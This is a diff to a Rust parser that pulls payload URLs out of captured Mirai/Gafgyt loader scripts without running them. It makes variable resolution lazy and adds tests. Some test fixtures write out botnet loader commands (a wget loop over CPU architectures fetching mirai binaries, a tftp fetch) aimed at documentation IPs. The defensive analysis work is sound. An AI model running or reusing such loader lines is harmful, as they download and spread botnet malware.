@@ -9,7 +9,8 @@
 //! loaders use:
 //! - simple scalar assignments (`VAR="value"` / `VAR='value'` / `VAR=word`, one per line, last
 //!   assignment wins, values may reference any other var in the body - forward or backward -
-//!   each resolved once, after the vars it references, see [`resolve_assignments`]);
+//!   each resolved once, and only when a url token, a `for` list or a `tftp` pair uses it, after
+//!   the vars it references, see [`Vars`]);
 //! - a single level of `for VAR in WORDS; do` where `WORDS` is either literal whitespace-separated
 //!   words or a single `$OTHERVAR` resolved from the assignment map, truncated to `MAX_URLS` words
 //!   before any expansion runs.
@@ -57,9 +58,10 @@ const MAX_RESOLVED_LEN: usize = MAX_BODY_LEN;
 
 /// Total bytes every substitution in one `extract_urls` call may produce, summed over resolved
 /// values, url candidates (accepted or rejected), `for` word lists taken from a variable and
-/// `tftp` parts. Four bodies' worth: a real loader spends a few KB. Once spent, nothing more is
-/// substituted, so work and memory stay O(body) whatever the input does; a url written out
-/// literally is still taken, so spending the budget up front does not hide one.
+/// `tftp` parts. Four bodies' worth: a real loader spends a few KB. Only values that a url token,
+/// a `for` list or a `tftp` pair actually uses are resolved, so an assignment nothing refers to
+/// costs nothing. Once spent, no further substitution succeeds, so work and memory stay O(body)
+/// whatever the input does; a url written out literally is still taken.
 const MAX_EXPANSION_BYTES: usize = 4 * MAX_BODY_LEN;
 
 /// What is left of `MAX_EXPANSION_BYTES` for one call. Every byte a substitution produces is
@@ -67,26 +69,19 @@ const MAX_EXPANSION_BYTES: usize = 4 * MAX_BODY_LEN;
 /// is a copy of the body and is not charged.
 struct Budget {
     left: usize,
-    spent: bool,
 }
 
 impl Budget {
     fn new() -> Self {
         Self {
             left: MAX_EXPANSION_BYTES,
-            spent: false,
         }
     }
 
     /// Append `s` to `out`, or refuse (`None`) when `out` would pass `MAX_RESOLVED_LEN` or the
-    /// call's budget cannot cover it. A refused candidate is abandoned by the caller; a refusal
-    /// for budget also marks the budget spent, which stops `for` expansion early.
+    /// call's budget cannot cover it. A refused candidate is abandoned by the caller.
     fn append(&mut self, out: &mut String, s: &str) -> Option<()> {
-        if out.len() + s.len() > MAX_RESOLVED_LEN {
-            return None;
-        }
-        if s.len() > self.left {
-            self.spent = true;
+        if out.len() + s.len() > MAX_RESOLVED_LEN || s.len() > self.left {
             return None;
         }
         self.left -= s.len();
@@ -98,7 +93,6 @@ impl Budget {
     /// resolved value).
     fn charge(&mut self, n: usize) -> Option<()> {
         if n > self.left {
-            self.spent = true;
             return None;
         }
         self.left -= n;
@@ -130,9 +124,8 @@ pub fn extract_urls(body: &[u8]) -> Vec<String> {
     };
 
     let mut budget = Budget::new();
-    let vars = parse_assignments(text, &mut budget);
-    let loops = parse_for_loops(text, &vars, &mut budget);
-    let lookup = |name: &str| vars.get(name).map(String::as_str);
+    let mut vars = Vars::parse(text);
+    let mut loops = parse_for_loops(text);
 
     let mut urls = Vec::new();
     let mut seen = HashSet::new();
@@ -145,7 +138,7 @@ pub fn extract_urls(body: &[u8]) -> Vec<String> {
         if urls.len() >= MAX_URLS {
             return urls;
         }
-        for url in expand_token(&raw, &vars, &loops, &mut budget) {
+        for url in expand_token(&raw, &mut vars, &mut loops, &mut budget) {
             if urls.len() >= MAX_URLS {
                 return urls;
             }
@@ -159,6 +152,9 @@ pub fn extract_urls(body: &[u8]) -> Vec<String> {
         if urls.len() >= MAX_URLS {
             return urls;
         }
+        vars.ensure(&file, &mut budget);
+        vars.ensure(&host, &mut budget);
+        let lookup = |name: &str| vars.get(name);
         let (Some(file_r), Some(host_r)) = (
             substitute_vars(&file, lookup, &mut budget),
             substitute_vars(&host, lookup, &mut budget),
@@ -177,75 +173,102 @@ pub fn extract_urls(body: &[u8]) -> Vec<String> {
     urls
 }
 
-/// Parse simple `VAR="value"` / `VAR='value'` / `VAR=word` assignments, one per line. Later
-/// assignments to the same name overwrite earlier ones (processed top-to-bottom). A value may
-/// reference a var assigned EARLIER OR LATER in the body - [`resolve_assignments`] resolves each
-/// var after the vars it references, so a forward reference (`A=$B` before `B` is assigned) still
-/// resolves.
-fn parse_assignments(text: &str, budget: &mut Budget) -> HashMap<String, String> {
-    let mut raw: Vec<(String, String)> = Vec::new();
-    let mut index: HashMap<String, usize> = HashMap::new();
-    for line in text.lines() {
-        let trimmed = line.trim_start();
-        let Some(name_len) = leading_ident_len(trimmed) else {
-            continue;
-        };
-        if name_len == 0 || trimmed.as_bytes().get(name_len) != Some(&b'=') {
-            continue;
-        }
-        let name = &trimmed[..name_len];
-        let value = raw_assignment_value(&trimmed[name_len + 1..]).to_string();
-        match index.get(name) {
-            Some(&i) => raw[i].1 = value,
-            None => {
-                index.insert(name.to_string(), raw.len());
-                raw.push((name.to_string(), value));
-            }
-        }
-    }
-    resolve_assignments(raw, &index, budget)
+/// The body's `VAR="value"` / `VAR='value'` / `VAR=word` assignments (one per line, a later
+/// assignment to a name overwrites an earlier one), resolved lazily. A value may reference a var
+/// assigned EARLIER OR LATER in the body.
+///
+/// Nothing is resolved at parse time: [`Vars::ensure`] resolves the vars a piece of text names,
+/// when that text is about to be substituted. An assignment no url token, `for` list or `tftp`
+/// pair refers to is never resolved and never spends [`Budget`], so a preamble of unrelated
+/// assignments cannot starve the loader that follows (or precedes) it.
+struct Vars {
+    /// In first-assignment order, which makes resolution independent of hash order.
+    raw: Vec<(String, String)>,
+    /// Name to position in `raw` and `slots`.
+    index: HashMap<String, usize>,
+    slots: Vec<Slot>,
 }
 
-/// Where one assignment stands in [`resolve_assignments`].
+/// Where one assignment stands in [`Vars::resolve`].
 enum Slot {
     /// Not reached yet.
     Pending,
     /// Its references are being resolved; a reference back to it is a cycle.
     Visiting,
     Resolved(String),
-    /// Its value would pass `MAX_RESOLVED_LEN` or the budget.
+    /// Its value would pass `MAX_RESOLVED_LEN` or the budget. Final: the budget only shrinks.
     TooLarge,
 }
 
-/// Resolve every value once, in dependency order (a depth-first walk over `$NAME` references,
-/// on an explicit stack so a long chain cannot overflow the thread's stack), substituting only
-/// vars already resolved. A reference that is unknown, that closes a cycle (`A=$A`, `A=$A$A`,
-/// `A=$B` / `B=$A`) or that names a var whose value was too large is left as its literal `$NAME`,
-/// so any value built on it keeps a `$` and a url that uses it is dropped. Each value is
-/// substituted exactly once, against values that are themselves final, so the output is the sum
-/// of what [`Budget`] allowed - never the repeated squaring a re-substitute-until-stable loop
-/// gives `A=$A$A`.
-///
-/// `index` maps each name to its position in `raw`; `raw` is in first-assignment order, which
-/// makes the result independent of hash order.
-fn resolve_assignments(
-    raw: Vec<(String, String)>,
-    index: &HashMap<String, usize>,
-    budget: &mut Budget,
-) -> HashMap<String, String> {
-    let mut slots: Vec<Slot> = raw.iter().map(|_| Slot::Pending).collect();
-    let mut stack: Vec<usize> = Vec::new();
-    for root in 0..raw.len() {
-        stack.push(root);
+impl Vars {
+    fn parse(text: &str) -> Self {
+        let mut raw: Vec<(String, String)> = Vec::new();
+        let mut index: HashMap<String, usize> = HashMap::new();
+        for line in text.lines() {
+            let trimmed = line.trim_start();
+            let Some(name_len) = leading_ident_len(trimmed) else {
+                continue;
+            };
+            if name_len == 0 || trimmed.as_bytes().get(name_len) != Some(&b'=') {
+                continue;
+            }
+            let name = &trimmed[..name_len];
+            let value = raw_assignment_value(&trimmed[name_len + 1..]).to_string();
+            match index.get(name) {
+                Some(&i) => raw[i].1 = value,
+                None => {
+                    index.insert(name.to_string(), raw.len());
+                    raw.push((name.to_string(), value));
+                }
+            }
+        }
+        let slots = raw.iter().map(|_| Slot::Pending).collect();
+        Self { raw, index, slots }
+    }
+
+    /// The resolved value of `name`, if it has been resolved by [`Vars::ensure`] and fit.
+    fn get(&self, name: &str) -> Option<&str> {
+        match self.slots.get(*self.index.get(name)?)? {
+            Slot::Resolved(v) => Some(v.as_str()),
+            _ => None,
+        }
+    }
+
+    /// Resolve every var `text` names, in the order it names them.
+    fn ensure(&mut self, text: &str, budget: &mut Budget) {
+        for name in find_var_refs(text) {
+            self.ensure_name(name, budget);
+        }
+    }
+
+    fn ensure_name(&mut self, name: &str, budget: &mut Budget) {
+        if let Some(&root) = self.index.get(name) {
+            self.resolve(root, budget);
+        }
+    }
+
+    /// Resolve var `root` once, after the vars it references (a depth-first walk over `$NAME`
+    /// references, on an explicit stack so a long chain cannot overflow the thread's stack),
+    /// substituting only vars already resolved. A reference that is unknown, that closes a cycle
+    /// (`A=$A`, `A=$A$A`, `A=$B` / `B=$A`) or that names a var whose value was too large is left
+    /// as its literal `$NAME`, so any value built on it keeps a `$` and a url that uses it is
+    /// dropped. Each value is substituted exactly once, against values that are themselves final,
+    /// so the output is the sum of what [`Budget`] allowed - never the repeated squaring a
+    /// re-substitute-until-stable loop gives `A=$A$A`. Already-resolved vars cost nothing.
+    fn resolve(&mut self, root: usize, budget: &mut Budget) {
+        if !matches!(self.slots[root], Slot::Pending) {
+            return;
+        }
+        let mut stack = vec![root];
         while let Some(&top) = stack.last() {
-            match slots[top] {
+            match self.slots[top] {
                 Slot::Pending => {
-                    slots[top] = Slot::Visiting;
-                    for name in find_var_refs(&raw[top].1) {
+                    self.slots[top] = Slot::Visiting;
+                    for name in find_var_refs(&self.raw[top].1) {
                         // A repeated reference pushes its var again; the stale entry is popped
                         // as already resolved, and the pushes are bounded by the value's length.
-                        if let Some(&dep) = index.get(name)
-                            && matches!(slots[dep], Slot::Pending)
+                        if let Some(&dep) = self.index.get(name)
+                            && matches!(self.slots[dep], Slot::Pending)
                         {
                             stack.push(dep);
                         }
@@ -254,14 +277,14 @@ fn resolve_assignments(
                 Slot::Visiting => {
                     stack.pop();
                     let value = substitute_vars(
-                        &raw[top].1,
-                        |name| match index.get(name).map(|&i| &slots[i]) {
+                        &self.raw[top].1,
+                        |name| match self.index.get(name).map(|&i| &self.slots[i]) {
                             Some(Slot::Resolved(v)) => Some(v.as_str()),
                             _ => None,
                         },
                         budget,
                     );
-                    slots[top] = value.map_or(Slot::TooLarge, Slot::Resolved);
+                    self.slots[top] = value.map_or(Slot::TooLarge, Slot::Resolved);
                 }
                 Slot::Resolved(_) | Slot::TooLarge => {
                     stack.pop();
@@ -269,13 +292,22 @@ fn resolve_assignments(
             }
         }
     }
-    raw.into_iter()
-        .zip(slots)
-        .filter_map(|((name, _), slot)| match slot {
-            Slot::Resolved(v) => Some((name, v)),
-            _ => None,
-        })
-        .collect()
+
+    /// Every var resolved, in first-assignment order (tests only: extraction resolves lazily).
+    #[cfg(test)]
+    fn resolved_map(mut self, budget: &mut Budget) -> HashMap<String, String> {
+        for i in 0..self.raw.len() {
+            self.resolve(i, budget);
+        }
+        self.raw
+            .into_iter()
+            .zip(self.slots)
+            .filter_map(|((name, _), slot)| match slot {
+                Slot::Resolved(v) => Some((name, v)),
+                _ => None,
+            })
+            .collect()
+    }
 }
 
 /// Length in bytes of a leading shell identifier (`[A-Za-z_][A-Za-z0-9_]*`) at the start of `s`,
@@ -297,7 +329,7 @@ fn leading_ident_len(s: &str) -> Option<usize> {
 }
 
 /// Extract the raw value text after `VAR=` (quote-stripped, or the first unquoted word),
-/// unsubstituted - [`resolve_assignments`] handles `$VAR` references afterward, once the whole map
+/// unsubstituted - [`Vars::resolve`] handles `$VAR` references afterward, once the whole map
 /// is known.
 fn raw_assignment_value(rest: &str) -> &str {
     if let Some(stripped) = rest.strip_prefix('"') {
@@ -312,16 +344,56 @@ fn raw_assignment_value(rest: &str) -> &str {
     }
 }
 
+/// One `for VAR in WORDS` list: literal words, or a single `$OTHERVAR` resolved on first use.
+enum LoopDef {
+    Words(Vec<String>),
+    Var(String),
+}
+
+struct Loops {
+    defs: HashMap<String, LoopDef>,
+    /// A `$OTHERVAR` list once taken from its value, charged to the budget exactly once; `None`
+    /// when the budget could not cover it.
+    taken: HashMap<String, Option<Vec<String>>>,
+}
+
+impl Loops {
+    /// The word list of loop variable `name`, at most `MAX_URLS` words. A list named by a var is
+    /// copied out of that var's resolved value on first use, so a `for` line nothing expands
+    /// costs nothing.
+    fn words(&mut self, name: &str, vars: &mut Vars, budget: &mut Budget) -> Option<&[String]> {
+        if let LoopDef::Var(var) = self.defs.get(name)? {
+            if !self.taken.contains_key(name) {
+                vars.ensure_name(var, budget);
+                let list: Vec<String> = vars
+                    .get(var)
+                    .map(|v| {
+                        v.split_whitespace()
+                            .take(MAX_URLS)
+                            .map(str::to_string)
+                            .collect()
+                    })
+                    .unwrap_or_default();
+                let list = budget
+                    .charge(list.iter().map(String::len).sum())
+                    .map(|()| list);
+                self.taken.insert(name.to_string(), list);
+            }
+            return self.taken.get(name)?.as_deref();
+        }
+        match self.defs.get(name)? {
+            LoopDef::Words(w) => Some(w),
+            LoopDef::Var(_) => None,
+        }
+    }
+}
+
 /// Parse `for VAR in WORDS; do` (or `for VAR in WORDS do`, or a `for` line whose `WORDS` runs to
-/// end of line with `do` on the next line) into a map of loop variable -> resolved word list.
-/// `WORDS` is either literal whitespace-separated words or a single `$OTHERVAR` / `${OTHERVAR}`
-/// resolved from `vars`.
-fn parse_for_loops(
-    text: &str,
-    vars: &HashMap<String, String>,
-    budget: &mut Budget,
-) -> HashMap<String, Vec<String>> {
-    let mut loops = HashMap::new();
+/// end of line with `do` on the next line) into a map of loop variable -> word list. `WORDS` is
+/// either literal whitespace-separated words or a single `$OTHERVAR` / `${OTHERVAR}`, resolved
+/// from the assignments when [`Loops::words`] first needs it.
+fn parse_for_loops(text: &str) -> Loops {
+    let mut defs = HashMap::new();
     for line in text.lines() {
         let trimmed = line.trim();
         let Some(after_for) = trimmed.strip_prefix("for ") else {
@@ -353,46 +425,40 @@ fn parse_for_loops(
             words.push(tok.to_string());
         }
 
-        let mut resolved = if words.len() == 1 {
-            match single_var_ref(&words[0]) {
-                // Copied out of a resolved value, so charged: every `for` line may name the same
-                // large value, and the line itself is only a few bytes.
-                Some(name) => {
-                    let list: Vec<String> = vars
-                        .get(&name)
-                        .map(|v| {
-                            v.split_whitespace()
-                                .take(MAX_URLS)
-                                .map(str::to_string)
-                                .collect()
-                        })
-                        .unwrap_or_default();
-                    if budget.charge(list.iter().map(String::len).sum()).is_none() {
-                        continue;
-                    }
-                    list
-                }
-                None => words,
-            }
+        let var = if words.len() == 1 {
+            single_var_ref(&words[0])
         } else {
-            words
+            None
         };
-        // Cap the candidate word list before any expansion happens: expand_token iterates
-        // every word for every matching url token found in the body, so an uncapped list
-        // (e.g. a crafted "ARCHS" with tens of thousands of words) makes that iteration cost
-        // attacker-controlled and unbounded by MAX_URLS, since a rejected (still-unresolved)
-        // candidate never reaches the accepted-url cap check. Truncating here bounds total
-        // expansion work to (url tokens found in the body) x MAX_URLS regardless of how large
-        // or how many times a loop's word list is referenced.
-        resolved.truncate(MAX_URLS);
+        let def = match var {
+            Some(name) => LoopDef::Var(name),
+            None => LoopDef::Words(words),
+        };
+        let def = match def {
+            // Cap the candidate word list before any expansion happens: expand_token iterates
+            // every word for every matching url token found in the body, so an uncapped list
+            // (e.g. a crafted "ARCHS" with tens of thousands of words) makes that iteration cost
+            // attacker-controlled and unbounded by MAX_URLS, since a rejected (still-unresolved)
+            // candidate never reaches the accepted-url cap check. Truncating here bounds total
+            // expansion work to (url tokens found in the body) x MAX_URLS regardless of how large
+            // or how many times a loop's word list is referenced.
+            LoopDef::Words(mut w) => {
+                w.truncate(MAX_URLS);
+                LoopDef::Words(w)
+            }
+            var => var,
+        };
 
         // Intentionally global and last-assignment-wins: if the body reuses the same loop
         // variable name across two different `for` loops, the later loop's word list wins for
         // both. Out of scope to fix - real captured Mirai/Gafgyt loaders use exactly one arch
         // loop.
-        loops.insert(loop_var.to_string(), resolved);
+        defs.insert(loop_var.to_string(), def);
     }
-    loops
+    Loops {
+        defs,
+        taken: HashMap::new(),
+    }
 }
 
 /// If `word` is exactly `$NAME` or `${NAME}` (nothing else), return `NAME`.
@@ -476,14 +542,9 @@ fn scan_tftp_pairs(text: &str) -> Vec<(String, String)> {
 /// it is a `for`-loop control variable) expand it into one URL per loop word. Returns an empty
 /// `Vec` if the token cannot be fully resolved - never emits a URL with a literal `$` left in it.
 /// Every candidate, accepted or rejected, is charged to `budget`.
-fn expand_token(
-    raw: &str,
-    vars: &HashMap<String, String>,
-    loops: &HashMap<String, Vec<String>>,
-    budget: &mut Budget,
-) -> Vec<String> {
-    let Some(after_vars) = substitute_vars(raw, |name| vars.get(name).map(String::as_str), budget)
-    else {
+fn expand_token(raw: &str, vars: &mut Vars, loops: &mut Loops, budget: &mut Budget) -> Vec<String> {
+    vars.ensure(raw, budget);
+    let Some(after_vars) = substitute_vars(raw, |name| vars.get(name), budget) else {
         return Vec::new();
     };
     if !after_vars.contains('$') {
@@ -497,12 +558,12 @@ fn expand_token(
     if refs.any(|other| other != loop_var) {
         return Vec::new();
     }
-    let Some(words) = loops.get(loop_var) else {
+    let Some(words) = loops.words(loop_var, vars, budget) else {
         return Vec::new();
     };
     let mut out = Vec::new();
     for word in words {
-        if budget.spent {
+        if budget.left == 0 {
             break;
         }
         let lookup = |name: &str| (name == loop_var).then_some(word.as_str());
@@ -769,7 +830,7 @@ done
 
     /// The resolved assignment map, as `extract_urls` builds it.
     fn resolved(text: &str) -> HashMap<String, String> {
-        parse_assignments(text, &mut Budget::new())
+        Vars::parse(text).resolved_map(&mut Budget::new())
     }
 
     /// Resolution and extraction of `body` finish within a hang guard, no resolved value is
@@ -853,26 +914,62 @@ done
         assert!(urls.is_empty(), "{} urls", urls.len());
     }
 
-    #[test]
-    fn a_spent_budget_still_takes_a_literal_url() {
-        // Charged: P1 1 KiB, P2 16 KiB, P3 64 KiB, Q0 and Q1 64 KiB each (Q2 is refused), R0
-        // and R1 16 KiB each, S 15 KiB: exactly 256 KiB, so not one byte is left for the url.
-        let mut body = format!("P0={}\n", "x".repeat(64));
-        body.push_str(&format!("P1={}\n", "$P0".repeat(16)));
-        body.push_str(&format!("P2={}\n", "$P1".repeat(16)));
-        body.push_str(&format!("P3={}\n", "$P2".repeat(4)));
-        for i in 0..3 {
-            body.push_str(&format!("Q{i}=$P3\n"));
+    /// Ordinary acyclic assignments that together resolve to more than `MAX_EXPANSION_BYTES`:
+    /// P3 is 64 KiB, Q0 to Q2 take 192 KiB of the 256 KiB (Q2 is the first refused), and 47
+    /// one-KiB copies of P1 take the 48128 bytes that are left, to the last byte. About 600 bytes.
+    fn spending_preamble() -> String {
+        let mut p = format!("P0={}\n", "x".repeat(64));
+        p.push_str(&format!("P1={}\n", "$P0".repeat(16)));
+        p.push_str(&format!("P2={}\n", "$P1".repeat(16)));
+        p.push_str(&format!("P3={}\n", "$P2".repeat(4)));
+        p.push_str("Q0=$P3\nQ1=$P3\nQ2=$P3\n");
+        for i in 0..47 {
+            p.push_str(&format!("U{i}=$P1\n"));
         }
-        body.push_str("R0=$P2\nR1=$P2\n");
-        body.push_str(&format!("S={}\n", "$P1".repeat(15)));
-        body.push_str("wget http://198.51.100.5/a.sh\n");
-        let mut budget = Budget::new();
-        parse_assignments(&body, &mut budget);
-        assert!(
-            budget.spent && budget.left == 0,
-            "the fixture must spend all of the budget"
+        p
+    }
+
+    const ARCH_LOADER: &str = "ARCHS=\"arm arm5 arm7 mips mpsl sh4 m68k ppc ppc440fp spc\"\n\
+         SERVER=\"198.51.100.4\"\n\
+         for arch in $ARCHS; do wget \"http://$SERVER/mirai.$arch\"; done\n";
+
+    // Unrelated assignments that would spend the whole budget if they were resolved eagerly hid
+    // every variable-built url, wherever they sat in the body. They are resolved only when a
+    // url token, `for` list or `tftp` pair uses them, so they cost nothing here.
+    #[test]
+    fn unreferenced_assignments_do_not_hide_a_variable_built_loader() {
+        let preamble = spending_preamble();
+        let mut eager = Budget::new();
+        Vars::parse(&preamble).resolved_map(&mut eager);
+        assert_eq!(eager.left, 0, "the fixture must spend the whole budget");
+
+        for body in [
+            format!("{preamble}{ARCH_LOADER}"),
+            format!("{ARCH_LOADER}{preamble}"),
+            format!("{preamble}{ARCH_LOADER}{preamble}"),
+        ] {
+            let (_, urls) = assert_bounded(&body);
+            assert_eq!(urls.len(), 10, "{urls:?}");
+            assert!(urls.contains(&"http://198.51.100.4/mirai.ppc440fp".to_string()));
+        }
+
+        // The same for a tftp pair and a `for` list named through an unrelated spend.
+        let tftp = format!("{preamble}H=198.51.100.5\ntftp -g -r m.mips $H\n");
+        assert_eq!(
+            extract_urls(tftp.as_bytes()),
+            vec!["tftp://198.51.100.5/m.mips".to_string()]
         );
+    }
+
+    // References that do spend the budget still end resolution, but a url written out literally
+    // after them is taken.
+    #[test]
+    fn a_budget_spent_by_used_references_still_takes_a_literal_url() {
+        let mut body = spending_preamble();
+        for i in 0..3 {
+            body.push_str(&format!("wget http://$Q{i}/x\n"));
+        }
+        body.push_str("wget http://198.51.100.5/a.sh\n");
         let (_, urls) = assert_bounded(&body);
         assert_eq!(urls, vec!["http://198.51.100.5/a.sh".to_string()]);
     }
